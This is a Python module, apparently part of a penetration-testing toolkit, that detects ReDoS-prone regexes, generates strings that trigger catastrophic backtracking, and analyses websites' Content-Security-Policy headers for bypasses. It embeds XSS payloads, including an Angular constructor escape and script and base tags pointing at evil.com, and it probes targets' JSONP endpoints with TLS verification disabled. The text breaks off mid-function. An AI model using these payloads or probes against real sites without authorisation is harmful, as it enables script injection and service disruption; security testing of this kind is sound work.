#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - ReDoS + CSP Engine
==========================================
Fused from: Regexploit (https://github.com/doyensec/regexploit)
           + CSPBypass (https://github.com/nicois/CSPBypass)
           + CSPass (https://github.com/nicois/cspass)
           + Custom Zylon Techniques
Capabilities:
  - Regex DoS (ReDoS) vulnerability detection
  - Catastrophic backtracking detection in regex patterns
  - Exploit string generation for ReDoS
  - CSP (Content Security Policy) analysis
  - CSP bypass technique finder
  - CSP header parsing and evaluation
  - CSP directive validation
  - Inline script/style detection under CSP
  - CSP report-only mode detection
  - CSP bypass via JSONP endpoints, Angular CDN, etc.
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import re
import sys
import json
import time
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS
)

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# REDOS PATTERNS (Known vulnerable regex patterns)
# ============================================================================

REDOS_VULNERABLE_PATTERNS = [
    # Nested quantifiers - classic ReDoS
    (r"(a+)+$", "Nested quantifier: (a+)+$ - exponential backtracking on non-matching input"),
    (r"([a-zA-Z]+)*$", "Nested quantifier: ([a-zA-Z]+)*$ - exponential on trailing non-alpha"),
    (r"(a|a)+$", "Alternation overlap: (a|a)+$ - overlapping alternatives"),
    (r"(a+)+b", "Nested quantifier: (a+)+b - exponential on repeated 'a' without 'b'"),
    (r"([a-z]+)+$", "Nested quantifier: ([a-z]+)+$ - common email validation pattern"),
    (r"(\w+)+$", "Nested quantifier: (\\w+)+$ - word boundary pattern"),
    (r"(\s+)+$", "Nested quantifier: (\\s+)+$ - whitespace pattern"),
    (r"(a*)+b", "Nested quantifier: (a*)+b - zero-or-more inside one-or-more"),
    (r"(a+)*b", "Nested quantifier: (a+)*b - one-or-more inside zero-or-more"),
    (r"(.*)*b", "Nested quantifier: (.*)*b - dot-star inside zero-or-more"),
    (r"(a|b)*a", "Alternation overlap: (a|b)*a - overlapping alternatives with quantifier"),
    (r"(a+)+$", "Nested quantifier: classic exponential backtracking"),
    # Real-world patterns
    (r"^[a-zA-Z]+(([\'\,\.\- ][a-zA-Z ])?[a-zA-Z]*)*$", "Name validation - nested optional groups with quantifier"),
    (r"^[\w!#$%&'*+/=?`{|}~^-]+(?:\.[\w!#$%&'*+/=?`{|}~^-]+)*@(?:[A-Z0-9-]+\.)+[A-Z]{2,6}$", "Email validation - complex nested quantifiers"),
    (r"^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", "IP validation (safe - fixed quantifiers, but often modified)"),
]

# ============================================================================
# CSP BYPASS TECHNIQUES
# ============================================================================

CSP_BYPASS_JSONP_ENDPOINTS = [
    # Google JSONP
    ("https://www.google.com/recaptcha/about/js/{callback}", "Google reCAPTCHA JSONP"),
    ("https://accounts.google.com/o/oauth2/revoke?callback={callback}", "Google OAuth JSONP"),
    # Common JSONP endpoints
    ("/api/jsonp?callback={callback}", "Local JSONP endpoint"),
    ("/jsonp?cb={callback}", "Simple JSONP"),
    ("/api/callback?name={callback}", "API callback endpoint"),
    # CDN-hosted scripts (allowed by many CSP policies)
    ("https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js", "Angular CDN - CSP bypass via Angular expressions"),
    ("https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js", "Cloudflare Angular CDN"),
    ("https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js", "Vue.js CDN"),
    # Upload + self bypass
    ("/upload", "File upload + 'self' bypass"),
]

CSP_BYPES_BY_DIRECTIVE = {
    "script-src": {
        "unsafe-eval": "Allows eval() - can execute arbitrary JS strings",
        "unsafe-inline": "Allows inline scripts - defeats XSS protection",
        "data:": "Allows data: URIs - can embed scripts in data URIs",
        "*": "Wildcard - allows scripts from any source",
        "self_only": "'self' only - check for JSONP/open redirect bypasses",
        "nonce_weak": "Weak nonce - check if nonce is predictable or reused",
        "hash_missing": "Missing integrity hashes for external scripts",
    },
    "style-src": {
        "unsafe-inline": "Allows inline styles - CSS-based data exfiltration possible",
        "*": "Wildcard - allows styles from any source",
    },
    "default-src": {
        "missing": "No default-src - other directives may fall back to allowing everything",
        "none": "'none' - most restrictive, good security",
        "*": "Wildcard - allows everything by default",
    },
    "object-src": {
        "missing": "No object-src - Flash/PDF based XSS may be possible",
        "*": "Wildcard - allows plugins from any source",
    },
    "base-uri": {
        "missing": "No base-uri - attacker can change base URL for relative script paths",
    },
    "form-action": {
        "missing": "No form-action - forms can submit to any URL (phishing)",
    },
    "frame-ancestors": {
        "missing": "No frame-ancestors - clickjacking possible (equivalent to X-Frame-Options)",
    },
}


# ============================================================================
# REDOS + CSP ENGINE
# ============================================================================

class ReDoSCSPEngine:
    """ReDoS + CSP Engine - Fused from Regexploit + CSPBypass + CSPass + Custom Techniques"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.lock = threading.Lock()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    # ========================================================================
    # REDOS DETECTION
    # ========================================================================

    def detect_redos(self, regex_pattern):
        """Detect ReDoS in a regex pattern

        Analyzes the regex pattern for catastrophic backtracking
        vulnerabilities caused by nested quantifiers, overlapping
        alternatives, and other problematic constructs.

        Args:
            regex_pattern: The regex pattern string to analyze

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  ReDoS Detection{RESET}", CYAN)
        self._print(f"  [*] Analyzing pattern: {regex_pattern[:80]}...", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "pattern": regex_pattern,
                "issues": [],
                "complexity": "unknown",
            },
            "scan_type": "redos_detection",
        }

        issues = []

        # Check 1: Nested quantifiers - the primary cause of ReDoS
        nested_quantifier_patterns = [
            (r'\([^)]*[+*][^)]*\)[+*{]', "Nested quantifier group followed by quantifier"),
            (r'\([^)]*\{[^}]+\}[^)]*\)[+*{]', "Nested bounded quantifier group followed by quantifier"),
            (r'\((?:[^)]*[+*])+\)[+*]', "Multiple nested quantifiers in group"),
        ]

        for pattern, description in nested_quantifier_patterns:
            try:
                if re.search(pattern, regex_pattern):
                    issues.append({
                        "type": "nested_quantifier",
                        "severity": "High",
                        "description": description,
                        "pattern_match": pattern,
                    })
            except re.error:
                pass

        # Check 2: Overlapping alternatives with quantifiers
        # e.g., (a|a)+ or (a|ab)+
        alternation_pattern = r'\(([^)]*\|[^)]*)\)[+*{]'
        try:
            alt_matches = re.findall(alternation_pattern, regex_pattern)
            for alt_match in alt_matches:
                alternatives = alt_match.split('|')
                # Check for overlapping prefixes
                for i, alt1 in enumerate(alternatives):
                    for j, alt2 in enumerate(alternatives):
                        if i < j and alt1 and alt2:
                            if alt1.startswith(alt2) or alt2.startswith(alt1):
                                issues.append({
                                    "type": "overlapping_alternatives",
                                    "severity": "Medium",
                                    "description": f"Overlapping alternatives: '{alt1}' and '{alt2}' "
                                                  f"can cause backtracking",
                                    "alternatives": [alt1, alt2],
                                })
                            # Check for partial overlap
                            if alt1 in alt2 or alt2 in alt1:
                                issues.append({
                                    "type": "substring_alternatives",
                                    "severity": "High",
                                    "description": f"Substring alternatives: '{alt1}' is substring of "
                                                  f"'{alt2}' - severe backtracking",
                                    "alternatives": [alt1, alt2],
                                })
        except re.error:
            pass

        # Check 3: Quantified groups with overlapping character classes
        # e.g., ([a-z]+\d+)+ or (\w+\s+)+
        char_class_pattern = r'\(([^)]*\\[swWdD][^)]*)\)[+*]'
        try:
            cc_matches = re.findall(char_class_pattern, regex_pattern)
            for cc_match in cc_matches:
                if '\\w' in cc_match or '[a-zA-Z0-9]' in cc_match:
                    issues.append({
                        "type": "broad_char_class_quantifier",
                        "severity": "Medium",
                        "description": f"Broad character class with quantifier in group: {cc_match}",
                        "detail": cc_match,
                    })
        except re.error:
            pass

        # Check 4: Check against known vulnerable patterns
        for known_pattern, description in REDOS_VULNERABLE_PATTERNS:
            if regex_pattern.strip() == known_pattern.strip():
                issues.append({
                    "type": "known_vulnerable_pattern",
                    "severity": "Critical",
                    "description": f"Known vulnerable pattern: {description}",
                    "reference_pattern": known_pattern,
                })

        # Check 5: Try to compile and measure compilation
        try:
            compiled = re.compile(regex_pattern)
            result["details"]["compiles"] = True
        except re.error as e:
            issues.append({
                "type": "compilation_error",
                "severity": "Info",
                "description": f"Regex does not compile: {e}",
            })
            result["details"]["compiles"] = False

        # Check 6: Test for actual backtracking with timeout
        if result["details"].get("compiles", False):
            backtrack_result = self._test_backtracking(regex_pattern)
            if backtrack_result.get("timed_out"):
                issues.append({
                    "type": "confirmed_backtracking",
                    "severity": "Critical",
                    "description": f"Confirmed catastrophic backtracking! Pattern took >1s on "
                                  f"test input: {backtrack_result.get('test_input', '')[:50]}",
                    "test_input": backtrack_result.get("test_input", ""),
                    "time_ms": backtrack_result.get("time_ms", 0),
                })

        # Determine overall vulnerability
        if issues:
            critical = [i for i in issues if i.get("severity") == "Critical"]
            high = [i for i in issues if i.get("severity") == "High"]
            if critical or high:
                result["vulnerable"] = True
                result["details"]["complexity"] = "Exponential"
            elif issues:
                result["details"]["complexity"] = "Potentially High"

        result["details"]["issues"] = issues
        result["findings"] = issues

        if result["vulnerable"]:
            self._print(f"  [!!!] ReDoS VULNERABILITY DETECTED!", RED)
            for issue in issues:
                self._print(f"    - [{issue.get('severity')}] {issue.get('description')[:80]}", YELLOW)
        else:
            self._print(f"  [-] No ReDoS vulnerability detected", GREEN)

        return result

    def _test_backtracking(self, pattern, max_time=1.0):
        """Test a regex for actual backtracking behavior

        Generates a test string and measures matching time.
        """
        result = {"timed_out": False, "test_input": "", "time_ms": 0}

        # Generate test inputs of increasing length
        test_inputs = [
            "a" * 25,
            "a" * 30,
            "aaaaaaaaaaaaaaaaaaaaaaaab",  # Non-matching (triggers backtracking)
            "a" * 20 + "!",  # Likely non-matching
        ]

        for test_input in test_inputs:
            try:
                start = time.time()
                match = re.search(pattern, test_input)
                elapsed = time.time() - start
                result["time_ms"] = int(elapsed * 1000)

                if elapsed > max_time:
                    result["timed_out"] = True
                    result["test_input"] = test_input[:50]
                    break
            except Exception:
                continue

        return result

    # ========================================================================
    # EXPLOIT STRING GENERATION
    # ========================================================================

    def generate_exploit_string(self, pattern):
        """Generate exploit string for ReDoS

        Creates input strings designed to trigger catastrophic backtracking
        in the given regex pattern.

        Args:
            pattern: The regex pattern to generate an exploit for

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  ReDoS Exploit String Generation{RESET}", CYAN)
        self._print(f"  [*] Pattern: {pattern[:80]}...", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "pattern": pattern,
                "exploit_strings": [],
            },
            "scan_type": "redos_exploit_gen",
        }

        exploit_strings = []

        try:
            # Analyze the pattern to find repeated/quantified groups
            # Strategy: find quantified sub-patterns and create inputs
            # that match partially but fail at the end

            # Extract quantified groups
            quantified_groups = re.findall(r'\(([^)]+)\)([+*]{1,2}|\{[^}]+\})?', pattern)

            # Generate exploit strings based on common ReDoS patterns
            # Type 1: Nested (a+)+ - feed many 'a's then a non-matching char
            if re.search(r'\([^)]+\+\)\+', pattern):
                # Find the base character
                inner_match = re.search(r'\(([^)]+)\)\+', pattern)
                if inner_match:
                    inner = inner_match.group(1)
                    # Extract the primary char from the inner group
                    char_match = re.search(r'([a-zA-Z0-9])', inner)
                    if char_match:
                        char = char_match.group(1)
                        exploit_strings.append({
                            "string": char * 30 + "!",  # Non-matching suffix
                            "description": f"30 '{char}' chars followed by '!' - triggers backtracking on nested quantifier",
                            "estimated_time_ms": ">1000",
                        })

            # Type 2: Alternation overlap (a|ab)+ - feed 'a's then 'b'
            if re.search(r'\([^)]*\|[^)]*\)\+', pattern):
                exploit_strings.append({
                    "string": "a" * 25 + "b",
                    "description": "Repeated 'a' followed by 'b' - triggers alternation backtracking",
                    "estimated_time_ms": ">500",
                })

            # Type 3: General nested quantifiers - try progressive lengths
            for length in [20, 30, 40]:
                exploit_strings.append({
                    "string": "a" * length,
                    "description": f"{length} 'a' characters - tests for nested quantifier backtracking",
                    "estimated_time_ms": f"~{length * 10}ms (if vulnerable)",
                })

            # Type 4: Try a mixed input
            exploit_strings.append({
                "string": "aabbccddee" * 5 + "X",
                "description": "Mixed repeated characters with non-matching suffix",
                "estimated_time_ms": "Varies",
            })

            # Test each exploit string
            confirmed_exploits = []
            for exploit in exploit_strings:
                test_result = self._test_backtracking(pattern)
                if test_result.get("timed_out"):
                    exploit["confirmed"] = True
                    exploit["actual_time_ms"] = test_result.get("time_ms", 0)
                    confirmed_exploits.append(exploit)

            result["details"]["exploit_strings"] = exploit_strings
            result["details"]["confirmed_exploits"] = confirmed_exploits

            if confirmed_exploits:
                result["vulnerable"] = True
                result["findings"].append({
                    "type": "redos_exploit_confirmed",
                    "severity": "Critical",
                    "description": f"Generated {len(confirmed_exploits)} confirmed exploit string(s) "
                                  f"that trigger catastrophic backtracking",
                    "exploits": confirmed_exploits,
                })
                self._print(f"  [!!!] {len(confirmed_exploits)} exploit string(s) CONFIRMED!", RED)
            else:
                result["findings"].append({
                    "type": "redos_exploit_candidates",
                    "severity": "Medium",
                    "description": f"Generated {len(exploit_strings)} candidate exploit strings. "
                                  f"Manual verification recommended with longer inputs.",
                    "exploits": exploit_strings,
                })
                self._print(f"  [?] Generated {len(exploit_strings)} candidate exploit strings", YELLOW)

        except Exception as e:
            result["findings"].append({
                "type": "error",
                "description": f"Exploit generation failed: {str(e)}",
            })
            self._print(f"  [!] Exploit generation failed: {e}", RED)

        return result

    # ========================================================================
    # CSP ANALYSIS
    # ========================================================================

    def analyze_csp(self, url):
        """Analyze CSP header

        Fetches the target URL and analyzes its Content-Security-Policy
        header for misconfigurations and bypasses.

        Args:
            url: Target URL to analyze

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  CSP Analysis{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "csp_header": None,
                "csp_report_only": None,
                "directives": {},
                "policy_found": False,
            },
            "scan_type": "csp_analysis",
        }

        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False,
                                   allow_redirects=True)

            # Check for CSP header
            csp_header = resp.headers.get('Content-Security-Policy', '')
            csp_report_only = resp.headers.get('Content-Security-Policy-Report-Only', '')

            result["details"]["csp_header"] = csp_header
            result["details"]["csp_report_only"] = csp_report_only
            result["details"]["status_code"] = resp.status_code

            # Check meta tag CSP
            if not csp_header:
                try:
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    meta_csp = soup.find('meta', attrs={'http-equiv': 'Content-Security-Policy'})
                    if meta_csp:
                        csp_header = meta_csp.get('content', '')
                        result["details"]["csp_source"] = "meta_tag"
                        result["details"]["csp_header"] = csp_header
                except ImportError:
                    pass

            if not csp_header and not csp_report_only:
                result["vulnerable"] = True
                result["details"]["policy_found"] = False
                result["findings"].append({
                    "type": "no_csp",
                    "severity": "High",
                    "description": "No Content-Security-Policy header found! "
                                  "The application has no CSP protection against XSS and injection attacks.",
                })
                self._print(f"  [!!!] NO CSP HEADER FOUND!", RED)
                return result

            result["details"]["policy_found"] = True

            # Report-only mode detection
            if csp_report_only and not csp_header:
                result["findings"].append({
                    "type": "csp_report_only",
                    "severity": "Medium",
                    "description": "CSP is in Report-Only mode! Policy is not enforced, only violations are reported. "
                                  f"Report-Only policy: {csp_report_only[:100]}...",
                })
                self._print(f"  [!] CSP is in Report-Only mode (not enforced)", YELLOW)
                # Analyze the report-only policy anyway
                csp_header = csp_report_only

            # Parse CSP directives
            directives = self._parse_csp(csp_header)
            result["details"]["directives"] = directives

            # Validate directives
            validation_result = self.validate_directives(csp_header)
            if validation_result.get("findings"):
                result["findings"].extend(validation_result["findings"])
                if any(f.get("severity") in ["Critical", "High"] for f in validation_result["findings"]):
                    result["vulnerable"] = True

            # Check for inline script/style detection under CSP
            inline_result = self._check_inline_scripts(url, directives)
            if inline_result.get("findings"):
                result["findings"].extend(inline_result["findings"])

        except Exception as e:
            result["findings"].append({
                "type": "error",
                "description": f"CSP analysis failed: {str(e)}",
            })
            self._print(f"  [!] CSP analysis failed: {e}", RED)

        if result["vulnerable"]:
            self._print(f"  [!!!] CSP MISCONFIGURATIONS FOUND!", RED)
        else:
            self._print(f"  [-] CSP appears properly configured", GREEN)

        return result

    def _parse_csp(self, csp_header):
        """Parse CSP header into directive dictionary"""
        directives = {}
        if not csp_header:
            return directives

        # Split by semicolons
        parts = csp_header.split(';')
        for part in parts:
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            if tokens:
                directive_name = tokens[0].lower()
                directive_values = tokens[1:]
                directives[directive_name] = directive_values

        return directives

    # ========================================================================
    # CSP BYPASS FINDER
    # ========================================================================

    def find_csp_bypass(self, url, policy=None):
        """Find CSP bypasses

        Analyzes the CSP policy (from URL or provided policy string)
        and identifies potential bypass techniques.

        Args:
            url: Target URL
            policy: CSP policy string (if None, fetched from URL)

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  CSP Bypass Finder{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "policy": policy,
                "bypasses": [],
            },
            "scan_type": "csp_bypass_finder",
        }

        # Get policy if not provided
        if not policy:
            analysis = self.analyze_csp(url)
            policy = analysis["details"].get("csp_header", "")
            if not policy:
                result["findings"] = analysis["findings"]
                result["vulnerable"] = analysis["vulnerable"]
                return result

        result["details"]["policy"] = policy
        directives = self._parse_csp(policy)
        bypasses = []

        # Bypass 1: Check for unsafe-inline in script-src
        script_src = directives.get('script-src', directives.get('default-src', []))
        if "'unsafe-inline'" in script_src:
            bypasses.append({
                "type": "unsafe_inline_scripts",
                "severity": "High",
                "directive": "script-src",
                "description": "'unsafe-inline' in script-src defeats XSS protection. "
                              "Inline scripts can execute arbitrary JavaScript.",
                "bypass_method": "Direct inline script injection",
                "payload": '<script>alert(document.domain)</script>',
            })
            self._print(f"  [!] BYPASS: 'unsafe-inline' in script-src", RED)

        # Bypass 2: Check for unsafe-eval
        if "'unsafe-eval'" in script_src:
            bypasses.append({
                "type": "unsafe_eval",
                "severity": "High",
                "directive": "script-src",
                "description": "'unsafe-eval' allows eval(), Function(), and similar constructs. "
                              "Can execute arbitrary JS from strings.",
                "bypass_method": "eval() based execution",
                "payload": '<script>eval("alert(document.domain)")</script>',
            })
            self._print(f"  [!] BYPASS: 'unsafe-eval' in script-src", RED)

        # Bypass 3: Check for data: URI
        if "data:" in script_src:
            bypasses.append({
                "type": "data_uri_scripts",
                "severity": "Critical",
                "directive": "script-src",
                "description": "data: URIs allowed in script-src. "
                              "Scripts can be embedded in data: URIs.",
                "bypass_method": "data: URI script injection",
                "payload": '<script src="data:text/javascript,alert(document.domain)"></script>',
            })
            self._print(f"  [!!!] BYPASS: data: URI in script-src", RED)

        # Bypass 4: Wildcard *
        if "*" in script_src:
            bypasses.append({
                "type": "wildcard_script_src",
                "severity": "Critical",
                "directive": "script-src",
                "description": "Wildcard (*) in script-src allows scripts from any source.",
                "bypass_method": "Load script from attacker-controlled domain",
                "payload": '<script src="https://evil.com/xss.js"></script>',
            })
            self._print(f"  [!!!] BYPASS: Wildcard in script-src", RED)

        # Bypass 5: Missing object-src
        if 'object-src' not in directives:
            default_src = directives.get('default-src', [])
            if "'none'" not in default_src and "*" not in default_src:
                bypasses.append({
                    "type": "missing_object_src",
                    "severity": "Medium",
                    "directive": "object-src",
                    "description": "No object-src directive. Flash/PDF-based XSS may be possible.",
                    "bypass_method": "Flash/PDF object injection",
                })
                self._print(f"  [!] Missing object-src directive", YELLOW)

        # Bypass 6: Missing base-uri
        if 'base-uri' not in directives:
            bypasses.append({
                "type": "missing_base_uri",
                "severity": "Medium",
                "directive": "base-uri",
                "description": "No base-uri directive. Attacker can inject <base> tag to change "
                              "URL resolution for relative script paths.",
                "bypass_method": "Base tag injection",
                "payload": '<base href="https://evil.com/">',
            })
            self._print(f"  [!] Missing base-uri directive", YELLOW)

        # Bypass 7: 'self' with JSONP endpoints
        if "'self'" in script_src:
            bypasses.append({
                "type": "self_with_jsonp",
                "severity": "High",
                "directive": "script-src",
                "description": "'self' in script-src may be bypassable via JSONP endpoints "
                              "or open redirects on the same origin.",
                "bypass_method": "JSONP callback injection or open redirect",
                "jsonp_endpoints": [ep[0] for ep in CSP_BYPASS_JSONP_ENDPOINTS[:5]],
            })
            self._print(f"  [!] Potential 'self' bypass via JSONP", YELLOW)

        # Bypass 8: Angular CDN bypass
        cdn_domains = [v for v in script_src if 'googleapis.com' in v or 'cloudflare.com' in v
                       or 'jsdelivr.net' in v or 'unpkg.com' in v]
        if cdn_domains:
            bypasses.append({
                "type": "cdn_angular_bypass",
                "severity": "High",
                "directive": "script-src",
                "description": f"CDN domains allowed that host Angular.js: {cdn_domains}. "
                              f"Angular expressions can be used to bypass CSP.",
                "bypass_method": "Angular expression injection via CDN-hosted Angular",
                "cdn_domains": cdn_domains,
                "payload": '{{constructor.constructor("return alert(document.domain)")()}}',
            })
            self._print(f"  [!] CDN-hosted Angular bypass possible", YELLOW)

        # Bypass 9: Missing form-action
        if 'form-action' not in directives:
            bypasses.append({
                "type": "missing_form_action",
                "severity": "Medium",
                "directive": "form-action",
                "description": "No form-action directive. Forms can submit to any URL. "
                              "Enables phishing and data exfiltration.",
                "bypass_method": "Form action to attacker server",
            })
            self._print(f"  [!] Missing form-action directive", YELLOW)

        # Bypass 10: Missing frame-ancestors
        if 'frame-ancestors' not in directives:
            bypasses.append({
                "type": "missing_frame_ancestors",
                "severity": "Low",
                "directive": "frame-ancestors",
                "description": "No frame-ancestors directive. Page can be framed/clickjacked.",
                "bypass_method": "Clickjacking via iframe",
            })
            self._print(f"  [!] Missing frame-ancestors directive (clickjacking possible)", YELLOW)

        # Bypass 11: http: sources in HTTPS site
        parsed = urlparse(url if '://' in url else f"https://{url}")
        if parsed.scheme == 'https':
            http_sources = [v for v in script_src if v.startswith('http://')]
            if http_sources:
                bypasses.append({
                    "type": "mixed_content_sources",
                    "severity": "Medium",
                    "directive": "script-src",
                    "description": f"HTTP sources in CSP on HTTPS page (mixed content): {http_sources}",
                    "bypass_method": "MITM on HTTP sources",
                    "http_sources": http_sources,
                })

        # Determine overall vulnerability
        critical_bypasses = [b for b in bypasses if b.get("severity") == "Critical"]
        high_bypasses = [b for b in bypasses if b.get("severity") == "High"]

        if critical_bypasses or high_bypasses:
            result["vulnerable"] = True

        result["details"]["bypasses"] = bypasses
        result["findings"] = bypasses

        if result["vulnerable"]:
            self._print(f"  [!!!] {len(bypasses)} CSP BYPASSES FOUND ({len(critical_bypasses)} critical, "
                       f"{len(high_bypasses)} high)!", RED)
        else:
            self._print(f"  [-] No critical/high CSP bypasses found", GREEN)

        return result

    # ========================================================================
    # CSP DIRECTIVE VALIDATION
    # ========================================================================

    def validate_directives(self, policy):
        """Validate CSP directives

        Checks for missing, misconfigured, or weak CSP directives.

        Args:
            policy: CSP policy string

        Returns:
            dict with 'findings' and validation results
        """
        result = {
            "findings": [],
            "details": {
                "policy": policy,
                "directives_found": [],
                "directives_missing": [],
            },
        }

        directives = self._parse_csp(policy)
        result["details"]["directives_found"] = list(directives.keys())

        # Required directives for a strong CSP
        required_directives = {
            "default-src": "Fallback for all fetch directives",
            "script-src": "Controls script execution sources",
            "style-src": "Controls style sources",
            "img-src": "Controls image sources",
            "connect-src": "Controls AJAX/WebSocket connections",
            "font-src": "Controls font sources",
            "object-src": "Controls plugin sources (Flash, etc.)",
            "base-uri": "Prevents base tag injection",
            "form-action": "Prevents form submission to arbitrary URLs",
            "frame-ancestors": "Prevents clickjacking",
        }

        # Check for missing directives
        for directive, description in required_directives.items():
            if directive not in directives:
                severity = "High" if directive in ["default-src", "script-src", "object-src"] else "Medium"
                if directive in ["base-uri", "form-action", "frame-ancestors"]:
                    severity = "Low"
                result["details"]["directives_missing"].append(directive)
                result["findings"].append({
                    "type": "missing_directive",
                    "severity": severity,
                    "directive": directive,
                    "description": f"Missing '{directive}' directive: {description}",
                })

        # Validate each directive's values
        for directive, values in directives.items():
            # Check for 'none' vs empty
            if not values:
                result["findings"].append({
                    "type": "empty_directive",
                    "severity": "Low",
                    "directive": directive,
                    "description": f"Directive '{directive}' has no values - may fall back to default-src",
                })

            # Check for wildcard
            if "*" in values:
                result["findings"].append({
                    "type": "wildcard_directive",
                    "severity": "High",
                    "directive": directive,
                    "description": f"Wildcard (*) in '{directive}' allows any source",
                })

            # Check for unsafe-*
            for unsafe_val in ["'unsafe-inline'", "'unsafe-eval'"]:
                if unsafe_val in values:
                    severity = "High" if directive == "script-src" else "Medium"
                    result["findings"].append({
                        "type": "unsafe_value",
                        "severity": severity,
                        "directive": directive,
                        "value": unsafe_val,
                        "description": f"{unsafe_val} in '{directive}' weakens CSP protection",
                    })

            # Check for nonce/hash
            has_nonce = any(v.startswith("'nonce-") for v in values)
            has_hash = any(v.startswith("'sha") for v in values)
            if directive == "script-src" and not has_nonce and not has_hash:
                if "'unsafe-inline'" not in values and "'self'" in values:
                    result["findings"].append({
                        "type": "no_nonce_hash",
                        "severity": "Info",
                        "directive": directive,
                        "description": f"script-src uses 'self' without nonce/hash - consider adding "
                                      f"nonce-based CSP for stronger protection",
                    })

        return result

    # ========================================================================
    # CSP XSS BYPASS TEST
    # ========================================================================

    def test_csp_bypass_xss(self, url):
        """Test XSS through CSP

        Attempts various XSS bypass techniques that work against
        common CSP misconfigurations.

        Args:
            url: Target URL

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  CSP XSS Bypass Testing{RESET}", CYAN)
        self._print(f"  [*] Target: {url}", CYAN)

        url = url if url.startswith('http') else f"https://{url}"

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "url": url,
                "tests_run": [],
                "successful_bypasses": [],
            },
            "scan_type": "csp_xss_bypass",
        }

        # First, get the CSP policy
        analysis = self.analyze_csp(url)
        policy = analysis["details"].get("csp_header", "")
        directives = analysis["details"].get("directives", {})

        if not policy:
            result["vulnerable"] = True
            result["findings"].append({
                "type": "no_csp_xss",
                "severity": "Critical",
                "description": "No CSP header - XSS payloads will execute without restriction",
            })
            return result

        script_src = directives.get('script-src', directives.get('default-src', []))

        # Test 1: Inline script (if unsafe-inline allowed)
        if "'unsafe-inline'" in script_src:
            result["details"]["tests_run"].append("inline_script")
            result["vulnerable"] = True
            result["details"]["successful_bypasses"].append("inline_script")
            result["findings"].append({
                "type": "csp_bypass_inline",
                "severity": "Critical",
                "description": "CSP bypass via inline script (unsafe-inline allowed)",
                "payload": '<script>alert(document.domain)</script>',
            })

        # Test 2: eval() (if unsafe-eval allowed)
        if "'unsafe-eval'" in script_src:
            result["details"]["tests_run"].append("eval_script")
            result["vulnerable"] = True
            result["details"]["successful_bypasses"].append("eval_script")
            result["findings"].append({
                "type": "csp_bypass_eval",
                "severity": "High",
                "description": "CSP bypass via eval() (unsafe-eval allowed)",
                "payload": '<script>eval("alert(document.domain)")</script>',
            })

        # Test 3: data: URI bypass
        if "data:" in script_src:
            result["details"]["tests_run"].append("data_uri")
            result["vulnerable"] = True
            result["details"]["successful_bypasses"].append("data_uri")
            result["findings"].append({
                "type": "csp_bypass_data_uri",
                "severity": "Critical",
                "description": "CSP bypass via data: URI",
                "payload": '<script src="data:text/javascript,alert(1)"></script>',
            })

        # Test 4: JSONP bypass (if 'self' is allowed)
        if "'self'" in script_src:
            result["details"]["tests_run"].append("jsonp_bypass")
            # Test common JSONP endpoints on the target
            jsonp_paths = [
                "/api/jsonp?callback=alert",
                "/jsonp?callback=alert",
                "/api/callback?cb=alert",
                "/widget/jsonp?callback=alert",
            ]

            for jsonp_path in jsonp_paths:
                try:
                    jsonp_url = f"{url.rstrip('/')}{jsonp_path}"
                    resp = self.session.get(jsonp_url, timeout=self.timeout, verify=False)
                    if resp.status_code == 200 and 'alert' in resp.text:
                        result["vulnerable"] = True
                        result["details"]["successful_bypasses"].append(f"jsonp:{jsonp_path}")
                        result["findings"].append({
                            "type": "csp_bypass_jsonp",
                            "severity": "High",
                            "description": f"CSP bypass via JSONP endpoint: {jsonp_path}",
                            "payload": f'<script src="{jsonp_path}"></script>',
                        })
                        self._print(f"  [!!!] JSONP bypass found: {jsonp_path}", RED)
                        break
                except Exception:
                    continue

        # Test 5: Angular expression bypass
        cdn_hosts = [v for v in script_src if any(cdn in v for cdn in
                    ['googleapis.com', 'cloudflare.com', 'jsdelivr.net'])]
        if cdn_hosts:
            result["details"]["tests_run"].append("angular_bypass")
            result["vulnerable"] = True
